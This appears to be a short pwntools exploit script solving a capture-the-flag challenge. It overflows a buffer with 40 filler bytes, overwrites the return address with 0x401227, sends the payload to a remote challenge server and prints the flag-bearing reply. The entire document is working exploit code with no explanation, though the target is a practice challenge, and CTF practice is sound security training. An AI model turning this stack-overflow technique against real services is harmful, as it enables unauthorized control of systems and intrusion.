from pwn import *

payload = b"A" * 40 + p64(0x401227)

conn = remote("b00fer.niccgetsspooky.xyz", 9001)

print(conn.recvline())
conn.sendline(payload)
print(conn.recvuntil(b"}"))